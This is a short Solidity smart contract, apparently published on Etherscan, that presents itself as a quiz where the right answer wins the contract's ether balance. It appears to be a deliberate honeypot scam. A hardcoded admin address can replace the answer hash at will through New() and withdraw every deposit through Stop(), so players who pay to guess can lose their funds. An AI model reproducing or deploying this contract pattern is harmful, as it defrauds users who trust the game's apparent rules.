/**
 *Submitted for verification at Etherscan.io on 2022-04-02
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract Decentralized_Quiz {
    function Try(string memory _response) public payable {
        require(msg.sender == tx.origin);

        if (
            responseHash == keccak256(abi.encode(_response)) &&
            msg.value > 0.001 ether
        ) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function test(string memory _response)
        public
        view
        returns (bytes32, bytes32)
    {
        require(msg.sender == tx.origin);
        return (responseHash, keccak256(abi.encode(_response)));
    }

    string public question;

    bytes32 responseHash;

    function Start(string calldata _question, string calldata _response)
        public
        payable
        isAdmin
    {
        if (responseHash == 0x0) {
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function Stop() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function New(string calldata _question, bytes32 _responseHash)
        public
        payable
        isAdmin
    {
        question = _question;
        responseHash = _responseHash;
    }

    constructor() {}

    modifier isAdmin() {
        require(msg.sender == 0x80C38AE1AF5a0197EEB0F16EC5989F89f8783008);
        _;
    }

    fallback() external {}
}